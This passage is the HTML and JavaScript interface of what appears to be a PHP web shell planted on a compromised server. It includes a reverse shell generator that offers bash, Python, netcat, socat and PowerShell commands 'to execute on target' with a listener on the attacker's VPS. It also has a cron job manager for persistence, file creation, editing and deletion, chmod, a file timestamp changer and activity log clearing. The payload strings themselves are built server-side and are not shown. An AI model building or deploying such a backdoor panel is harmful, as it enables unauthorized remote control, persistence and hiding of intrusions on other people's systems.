                <div style="text-align:center;padding:40px;">
                    <div class="popup-loader"></div>
                    <p style="color:#446644;margin-top:16px;">🔍 Scanning for malware & backdoors...</p>
                </div>
            </div>
            <div id="scanResults" style="display:none;"></div>
        </div>
        <div class="popup-footer">
            <button class="btn-close-popup" id="closeScanPopup2">CLOSE</button>
            <button class="btn-copy-log" id="scanDeleteSelected" style="background:rgba(204,68,102,0.08);border-color:rgba(204,68,102,0.15);color:#ff4466;">🗑 DELETE SELECTED</button>
            <button class="btn-copy-log" id="scanDeleteAll" style="background:rgba(204,68,102,0.08);border-color:rgba(204,68,102,0.15);color:#ff4466;">🗑 DELETE ALL</button>
        </div>
    </div>
</div>

<!-- ========== REVERSE SHELL POPUP ========== -->
<div class="popup-overlay" id="reverseShellPopup">
    <div class="popup-box">
        <div class="popup-header">
            <h2><span>💀</span> REVERSE SHELL GENERATOR</h2>
            <button class="close-btn" id="closeReversePopup">✕</button>
        </div>
        <div class="popup-body" id="reverseBody">
            <form id="reverseForm" style="display:flex;flex-direction:column;gap:10px;">
                <label>🌐 IP Address:</label>
                <input type="text" id="rs_ip" value="<?= $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1' ?>" style="width:100%;">
                <label>🔌 Port:</label>
                <input type="number" id="rs_port" value="4444" style="width:100%;">
                <label>📦 Shell Type:</label>
                <select id="rs_type" style="width:100%;">
                    <option value="bash">Bash</option>
                    <option value="python">Python3</option>
                    <option value="php">PHP</option>
                    <option value="nc">Netcat</option>
                    <option value="socat">Socat</option>
                    <option value="powershell">PowerShell</option>
                </select>
                <button type="button" class="btn-submit" onclick="generateReverseShell()" style="width:100%;">⚡ GENERATE</button>
            </form>
            <div id="reverseOutput" style="margin-top:12px;display:none;">
                <label style="color:#668866;">📤 Command to execute on target:</label>
                <div id="rsCommand" style="background:rgba(0,0,0,0.4);padding:10px;border-radius:4px;color:#00ff66;word-break:break-all;font-size:12px;border:1px solid rgba(0,255,100,0.1);"></div>
                <label style="color:#668866;margin-top:8px;">🎧 Listener command (run on your VPS):</label>
                <div id="rsListener" style="background:rgba(0,0,0,0.4);padding:10px;border-radius:4px;color:#ffcc00;word-break:break-all;font-size:12px;border:1px solid rgba(255,204,0,0.1);"></div>
                <button class="btn-submit" onclick="copyReverseShell()" style="margin-top:8px;width:100%;">📋 COPY COMMAND</button>
            </div>
        </div>
        <div class="popup-footer">
            <button class="btn-close-popup" id="closeReversePopup2">CLOSE</button>
        </div>
    </div>
</div>

<!-- ========== CRON POPUP ========== -->
<div class="popup-overlay" id="cronPopup">
    <div class="popup-box">
        <div class="popup-header">
            <h2><span>⏰</span> CRON JOB MANAGER</h2>
            <button class="close-btn" id="closeCronPopup">✕</button>
        </div>
        <div class="popup-body" id="cronBody">
            <div id="cronList" style="margin-bottom:12px;">
                <div style="color:#446644;">Loading cron jobs...</div>
            </div>
            <hr style="border-color:rgba(0,255,100,0.06);margin:10px 0;">
            <form id="cronForm" style="display:flex;flex-direction:column;gap:8px;">
                <label>⏱ Schedule (cron format):</label>
                <input type="text" id="cronSchedule" placeholder="*/5 * * * *" value="* * * * *" style="width:100%;">
                <label>📝 Command:</label>
                <input type="text" id="cronCommand" placeholder="/path/to/script.sh" style="width:100%;">
                <button type="button" class="btn-submit" onclick="addCronJob()" style="width:100%;">➕ ADD CRON</button>
            </form>
        </div>
        <div class="popup-footer">
            <button class="btn-close-popup" id="closeCronPopup2">CLOSE</button>
        </div>
    </div>
</div>

<!-- ========== ACTIVITY LOG POPUP ========== -->
<div class="popup-overlay" id="activityPopup">
    <div class="popup-box">
        <div class="popup-header">
            <h2><span>📋</span> ACTIVITY LOG</h2>
            <button class="close-btn" id="closeActivityPopup">✕</button>
        </div>
        <div class="popup-body" id="activityBody" style="max-height:60vh;">
            <div id="activityContent" style="font-size:11px;color:#88aa88;white-space:pre-wrap;font-family:'JetBrains Mono',monospace;"></div>
        </div>
        <div class="popup-footer">
            <button class="btn-close-popup" id="closeActivityPopup2">CLOSE</button>
            <button class="btn-copy-log" id="clearActivityBtn" style="background:rgba(204,68,102,0.08);border-color:rgba(204,68,102,0.15);color:#ff4466;">🗑 CLEAR LOG</button>
        </div>
    </div>
</div>

<!-- ========== ACTION POPUP ========== -->
<div class="popup-overlay" id="actionPopup">
    <div class="popup-box">
        <div class="popup-header">
            <h2><span id="actionIcon">⚡</span> <span id="actionTitle">Action</span></h2>
            <button class="close-btn" id="closeActionPopup">✕</button>
        </div>
        <div class="popup-body" id="actionBody"></div>
        <div class="popup-footer">
            <button class="btn-close-popup" id="closeActionPopup2">CANCEL</button>
        </div>
    </div>
</div>

<!-- ========== CREATE FILE POPUP ========== -->
<div class="popup-overlay" id="createFilePopup">
    <div class="popup-box">
        <div class="popup-header">
            <h2><span>📄</span> CREATE NEW FILE</h2>
            <button class="close-btn" id="closeCreatePopup">✕</button>
        </div>
        <div class="popup-body" id="createFileBody">
            <form method="post" id="createFileForm">
                <label>📛 Filename:</label>
                <input type="text" name="filename" id="newFilename" placeholder="example.php" required>
                <label>📝 File Content:</label>
                <textarea name="file_content" id="newFileContent" placeholder="Write your code here..." style="min-height:200px;"></textarea>
                <button type="submit" name="create_file" value="1" class="btn-submit" style="width:100%;">✅ CREATE</button>
            </form>
        </div>
        <div class="popup-footer">
            <button class="btn-close-popup" id="closeCreatePopup2">CANCEL</button>
        </div>
    </div>
</div>

<!-- ========== SCRIPTS ========== -->
<script>
// TIDAK ADA MATRIX RAIN LAGI DI SINI, MAKA TAMPILAN DEPAN MENJADI LEBIH RINGAN DAN AMAN
// ========== BULK DELETE FUNCTIONS ==========
function updateBulkCounter() {
    const checkboxes = document.querySelectorAll('.file-checkbox:checked');
    const count = checkboxes.length;
    const counter = document.getElementById('bulkCounter');
    const btn = document.getElementById('bulkDeleteBtn');
    
    if(count > 0){
        counter.textContent = count + ' selected';
        counter.classList.add('active');
        btn.disabled = false;
    } else {
        counter.textContent = '0 selected';
        counter.classList.remove('active');
        btn.disabled = true;
    }
}

function toggleAllChecks(master) {
    const checkboxes = document.querySelectorAll('.file-checkbox');
    checkboxes.forEach(cb => cb.checked = master.checked);
    updateBulkCounter();
}

document.getElementById('bulkDeleteBtn').addEventListener('click', function(e) {
    e.preventDefault();
    
    const checkboxes = document.querySelectorAll('.file-checkbox:checked');
    if(checkboxes.length === 0) {
        showStatus('❌ No files selected!', 'error');
        return;
    }
    
    const files = [];
    checkboxes.forEach(cb => files.push(cb.value));
    
    if(!confirm(`⚠️ Delete ${files.length} file(s)? This cannot be undone!`)) return;
    
    this.disabled = true;
    this.textContent = '⏳ DELETING...';
    
    const formData = new FormData();
    formData.append('bulk_delete', '1');
    files.forEach(f => formData.append('selected_files[]', f));
    
    fetch(window.location.href, {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(html => {
        window.location.reload();
    })
    .catch(err => {
        showStatus('❌ Error: ' + err.message, 'error');
        this.disabled = false;
        this.textContent = '🗑 DELETE SELECTED';
    });
});

function showStatus(message, type) {
    const container = document.getElementById('statusMessageContainer');
    if(!container) return;
    
    const oldMsg = container.querySelector('.status-msg');
    if(oldMsg) oldMsg.remove();
    
    const newDiv = document.createElement('div');
    newDiv.className = 'status-msg ' + type;
    newDiv.textContent = message;
    container.appendChild(newDiv);
    
    setTimeout(() => {
        newDiv.style.opacity = '0.7';
        setTimeout(() => {
            newDiv.remove();
        }, 3000);
    }, 3000);
}

// ========== ACTION POPUP ==========
function openPopup(action, filepath, filename, extra) {
    const popup = document.getElementById('actionPopup');
    const body = document.getElementById('actionBody');
    const title = document.getElementById('actionTitle');
    const icon = document.getElementById('actionIcon');
    
    let html = '';
    const enc_path = encodeURIComponent(filepath);
    const enc_name = encodeURIComponent(filename);
    
    switch(action){
        case 'edit':
            icon.textContent = '✏️';
            title.textContent = 'Edit File: ' + filename;
            fetch('?get_file_content=' + encodeURIComponent(filepath))
                .then(res => {
                    if(!res.ok) throw new Error('Failed to load file');
                    return res.text();
                })
                .then(content => {
                    const textarea = document.querySelector('#actionBody textarea');
                    if(textarea) textarea.value = content;
                })
                .catch(err => {
                    const textarea = document.querySelector('#actionBody textarea');
                    if(textarea) textarea.value = '❌ Error loading file: ' + err.message;
                });
            html = `
                <form method="post" action="?edit=${enc_path}">
                    <input type="hidden" name="save_edit" value="1">
                    <textarea name="file_content" style="min-height:250px;">⏳ Loading content...</textarea>
                    <button type="submit" class="btn-submit">💾 SAVE</button>
                </form>
            `;
            break;
        case 'rename':
            icon.textContent = '📝';
            title.textContent = 'Rename: ' + filename;
            html = `
                <form method="post">
                    <input type="hidden" name="rename_file" value="${filepath}">
                    <label>New Name:</label>
                    <input type="text" name="new_name" value="${filename}" required>
                    <button type="submit" class="btn-submit">✅ RENAME</button>
                </form>
            `;
            break;
        case 'chmod':
            icon.textContent = '🔒';
            title.textContent = 'Chmod: ' + filename;
            html = `
                <form method="post">
                    <input type="hidden" name="chmod_file" value="${filepath}">
                    <label>Permissions (e.g. 755, 644):</label>
                    <input type="text" name="permissions" value="${extra || '755'}" pattern="[0-7]{3,4}" required>
                    <button type="submit" class="btn-submit">✅ APPLY</button>
                </form>
            `;
            break;
        case 'chdate':
            icon.textContent = '📅';
            title.textContent = 'Change Date: ' + filename;
            html = `
                <form method="post">
                    <input type="hidden" name="chdate_file" value="${filepath}">
                    <label>New Date/Time (YYYY-MM-DD HH:MM:SS):</label>
                    <input type="text" name="new_date" value="${extra || ''}" required>
                    <button type="submit" class="btn-submit">✅ UPDATE</button>
                </form>
            `;
            break;
        case 'unzip':
            icon.textContent = '📦';
            title.textContent = 'Unzip: ' + filename;
            html = `
                <form method="post">
                    <input type="hidden" name="unzip_file" value="${filepath}">
                    <p style="color:#88aa88;">Extract to: <span style="color:#00ff66;">${filename.replace('.zip','')}/</span></p>
                    <button type="submit" class="btn-submit">📂 EXTRACT</button>
                </form>
            `;
            break;
        default:
            html = '<p style="color:#cc4466;">Unknown action</p>';
    }
    
    body.innerHTML = html;
    popup.classList.add('active');
}

document.querySelectorAll('#closeActionPopup, #closeActionPopup2').forEach(btn => {
    btn.addEventListener('click', function() {
        document.getElementById('actionPopup').classList.remove('active');
    });
});

document.getElementById('actionPopup').addEventListener('click', function(e) {
    if (e.target === this) {
        this.classList.remove('active');
    }
});

// ========== CREATE FILE POPUP ==========
function openCreateFilePopup() {
    document.getElementById('createFilePopup').classList.add('active');
    document.getElementById('newFilename').value = '';
    document.getElementById('newFileContent').value = '';
    setTimeout(() => document.getElementById('newFilename').focus(), 100);
}

document.querySelectorAll('#closeCreatePopup, #closeCreatePopup2').forEach(btn => {
    btn.addEventListener('click', function() {
        document.getElementById('createFilePopup').classList.remove('active');
    });
});

document.getElementById('createFilePopup').addEventListener('click', function(e) {
    if (e.target === this) {
        this.classList.remove('active');
    }
});

// ========== SCAN MALWARE ==========
function openScanPopup() {
    const popup = document.getElementById('scanPopup');
    const loading = document.getElementById('scanLoading');
    const results = document.getElementById('scanResults');
    
    popup.classList.add('active');
    loading.style.display = 'block';
    results.style.display = 'none';
    results.innerHTML = '';
    
    fetch(window.location.href, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'scan_malware=1'
    })
    .then(response => response.json())
    .then(data => {
        loading.style.display = 'none';
        results.style.display = 'block';
        
        if(data.success && data.count > 0){
            renderScanResults(data.results, data.count);
        } else if(data.success && data.count === 0){
            results.innerHTML = '<div style="text-align:center;padding:40px;color:#00ff66;">✅ No malware or backdoor detected! Clean system.</div>';
        } else {
            results.innerHTML = '<div style="text-align:center;padding:40px;color:#ff4466;">❌ Error scanning files.</div>';
        }
    })
    .catch(err => {
        loading.innerHTML = '<div style="text-align:center;padding:40px;color:#ff4466;">❌ Error: ' + err.message + '</div>';
    });
}

function renderScanResults(resultsData, count) {
    const results = document.getElementById('scanResults');
    
    if(!resultsData || resultsData.length === 0){
        results.innerHTML = '<div style="text-align:center;padding:40px;color:#00ff66;">✅ No malware or backdoor detected! Clean system.</div>';
        return;
    }
    
    let html = `<div style="margin-bottom:12px;color:#668866;">🔴 Found ${count} suspicious/malware file(s)</div>`;
    html += `<table style="width:100%;border-collapse:collapse;font-size:12px;">`;
    html += `<tr style="background:rgba(0,255,100,0.04);">
                <th style="padding:6px 10px;text-align:left;">File</th>
                <th style="padding:6px 10px;text-align:center;">Score</th>
                <th style="padding:6px 10px;text-align:center;">Size</th>
                <th style="padding:6px 10px;text-align:center;">Modified</th>
                <th style="padding:6px 10px;text-align:center;">Action</th>
             </tr>`;
    
    resultsData.forEach(result => {
        const isDanger = result.score >= 3 || result.is_malware;
        const color = isDanger ? '#ff4466' : '#ffcc00';
        const size = result.size > 1048576 ? (result.size / 1048576).toFixed(2) + ' MB' : (result.size / 1024).toFixed(2) + ' KB';
        
        html += `<tr style="border-bottom:1px solid rgba(0,255,100,0.04);">
                    <td style="padding:6px 10px;color:#88aa88;word-break:break-all;">
                        <span style="color:${color};">${isDanger ? '🔴' : '⚠️'}</span>
                        ${escapeHtml(result.basename || result.path)}
                        ${result.is_encoded ? ' <span style="color:#ff4466;font-size:9px;">[ENCODED]</span>' : ''}
                        ${result.is_malware ? ' <span style="color:#ff4466;font-size:9px;">[MALWARE]</span>' : ''}
                        <br><span style="font-size:9px;color:#446644;">${escapeHtml(result.path)}</span>
                        ${result.reason ? `<br><span style="font-size:9px;color:#ff8844;">${escapeHtml(result.reason)}</span>` : ''}
                    </td>
                    <td style="padding:6px 10px;text-align:center;color:${color};font-weight:bold;">${result.score}</td>
                    <td style="padding:6px 10px;text-align:center;color:#668866;">${size}</td>
                    <td style="padding:6px 10px;text-align:center;color:#668866;font-size:11px;">${result.modified}</td>
                    <td style="padding:6px 10px;text-align:center;">
                        <button class="action-btn" onclick="viewScanFile('${result.full_path}')">👁️ View</button>
                        <button class="action-btn danger delete-scan-btn" data-path="${result.full_path}">🗑️ Del</button>
                    </td>
                 </tr>`;
    });
    
    html += `</table>`;
    results.innerHTML = html;
    
    document.querySelectorAll('.delete-scan-btn').forEach(btn => {
        btn.removeEventListener('click', deleteScanFileHandler);
        btn.addEventListener('click', deleteScanFileHandler);
    });
}

function deleteScanFileHandler(e) {
    const btn = e.currentTarget;
    const path = btn.dataset.path;
    
    if(!confirm('🗑️ Delete this file?\n\n' + path)) return;
    
    btn.textContent = '⏳...';
    btn.disabled = true;
    
    fetch(window.location.href, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'delete_file=' + encodeURIComponent(path)
    })
    .then(response => response.json())
    .then(data => {
        if(data.success){
            btn.textContent = '✅ Deleted';
            btn.style.background = 'rgba(0,255,100,0.08)';
            btn.style.color = '#00ff66';
            btn.closest('tr').style.opacity = '0.5';
            setTimeout(() => { window.location.reload(); }, 1500);
        } else {
            btn.textContent = '❌ Failed';
            btn.style.background = 'rgba(204,68,102,0.08)';
            btn.style.color = '#ff4466';
            btn.disabled = false;
            alert('❌ ' + data.message);
        }
    })
    .catch(err => {
        btn.textContent = '❌ Error';
        btn.disabled = false;
        alert('❌ Error: ' + err.message);
    });
}

function viewScanFile(path) {
    window.open('?edit=' + encodeURIComponent(path), '_blank');
}

document.querySelectorAll('#closeScanPopup, #closeScanPopup2').forEach(btn => {
    btn.addEventListener('click', function() {
        document.getElementById('scanPopup').classList.remove('active');
    });
});

document.getElementById('scanPopup').addEventListener('click', function(e) {
    if (e.target === this) this.classList.remove('active');
});

// ========== REVERSE SHELL ==========
function openReverseShellPopup() {
    document.getElementById('reverseShellPopup').classList.add('active');
    document.getElementById('reverseOutput').style.display = 'none';
}

function generateReverseShell() {
    const ip = document.getElementById('rs_ip').value;
    const port = document.getElementById('rs_port').value;
    const type = document.getElementById('rs_type').value;
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'generate_reverse_shell=1&rs_ip=' + encodeURIComponent(ip) + '&rs_port=' + encodeURIComponent(port) + '&rs_type=' + encodeURIComponent(type)
    })
    .then(response => response.json())
    .then(data => {
        if(data.success){
            document.getElementById('rsCommand').textContent = data.command;
            document.getElementById('rsListener').textContent = data.listener;
            document.getElementById('reverseOutput').style.display = 'block';
        }
    })
    .catch(err => {
        alert('Error: ' + err.message);
    });
}

function copyReverseShell() {
    const cmd = document.getElementById('rsCommand').textContent;
    navigator.clipboard.writeText(cmd).then(() => {
        alert('✅ Command copied to clipboard!');
    }).catch(() => {
        alert('❌ Failed to copy. Select manually.');
    });
}

document.querySelectorAll('#closeReversePopup, #closeReversePopup2').forEach(btn => {
    btn.addEventListener('click', function() {
        document.getElementById('reverseShellPopup').classList.remove('active');
    });
});

document.getElementById('reverseShellPopup').addEventListener('click', function(e) {
    if (e.target === this) this.classList.remove('active');
});

// ========== CRON JOB ==========
function openCronPopup() {
    const popup = document.getElementById('cronPopup');
    const list = document.getElementById('cronList');
    popup.classList.add('active');
    list.innerHTML = '<div style="color:#446644;">⏳ Loading cron jobs...</div>';
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'get_cron_jobs=1'
    })
    .then(response => response.json())
    .then(data => {
        if(data.success){
            if(data.jobs && data.jobs.length > 0){
                let html = '<div style="color:#668866;margin-bottom:8px;">📋 ' + data.jobs.length + ' cron job(s):</div>';
                data.jobs.forEach((job, idx) => {
                    html += `<div class="cron-item">
                                <span class="cmd">${escapeHtml(job)}</span>
                                <span class="del-cron" onclick="deleteCronJob(${idx})">✕</span>
                            </div>`;
                });
                list.innerHTML = html;
            } else {
                list.innerHTML = '<div style="color:#446644;">📭 No cron jobs found for this user.</div>';
            }
        } else {
            list.innerHTML = '<div style="color:#ff4466;">❌ Failed to load cron jobs.</div>';
        }
    })
    .catch(err => {
        list.innerHTML = '<div style="color:#ff4466;">❌ Error: ' + err.message + '</div>';
    });
}

function addCronJob() {
    const schedule = document.getElementById('cronSchedule').value;
    const command = document.getElementById('cronCommand').value;
    
    if(!schedule || !command){
        alert('❌ Please fill in both fields.');
        return;
    }
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'add_cron_job=1&cron_schedule=' + encodeURIComponent(schedule) + '&cron_command=' + encodeURIComponent(command)
    })
    .then(response => response.json())
    .then(data => {
        alert(data.message);
        if(data.success) openCronPopup();
    })
    .catch(err => {
        alert('❌ Error: ' + err.message);
    });
}

function deleteCronJob(index) {
    if(!confirm('Delete this cron job?')) return;
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'delete_cron_job=1&cron_index=' + index
    })
    .then(response => response.json())
    .then(data => {
        alert(data.message);
        if(data.success) openCronPopup();
    })
    .catch(err => {
        alert('❌ Error: ' + err.message);
    });
}

document.querySelectorAll('#closeCronPopup, #closeCronPopup2').forEach(btn => {
    btn.addEventListener('click', function() {
        document.getElementById('cronPopup').classList.remove('active');
    });
});

document.getElementById('cronPopup').addEventListener('click', function(e) {
    if (e.target === this) this.classList.remove('active');
});

// ========== ACTIVITY LOG ==========
function openActivityPopup() {
    const popup = document.getElementById('activityPopup');
    const content = document.getElementById('activityContent');
    popup.classList.add('active');
    content.textContent = '⏳ Loading activity log...';
    
    fetch('?view_activity_log=1')
    .then(response => response.text())
    .then(data => {
        content.textContent = data || '📭 No activity logged yet.';
    })
    .catch(err => {
        content.textContent = '❌ Error loading log: ' + err.message;
    });
}

document.getElementById('clearActivityBtn').addEventListener('click', function() {
    if(!confirm('🗑️ Clear all activity log?')) return;
    
    fetch(window.location.href, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'clear_activity_log=1'
    })
    .then(response => response.json())
    .then(data => {
        alert(data.message);
        if(data.success) openActivityPopup();
    })
    .catch(err => {
        alert('❌ Error: ' + err.message);
    });
});

document.querySelectorAll('#closeActivityPopup, #closeActivityPopup2').forEach(btn => {
    btn.addEventListener('click', function() {
        document.getElementById('activityPopup').classList.remove('active');
    });
});

document.getElementById('activityPopup').addEventListener('click', function(e) {
    if (e.target === this) this.classList.remove('active');
});

function escapeHtml(text) {
    if(!text) return '';
    return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
</script>

<script>
let hist=[],idx=-1;
document.getElementById('cmdInput').addEventListener('keydown',function(e){
    if(e.key==='Enter'){hist.push(this.value);idx=hist.length}
    if(e.key==='ArrowUp'){e.preventDefault();if(idx>0)idx--;this.value=hist[idx]||''}
    if(e.key==='ArrowDown'){e.preventDefault();if(idx<hist.length-1)idx++;this.value=hist[idx]||''}
});
</script>

</body>
</html>
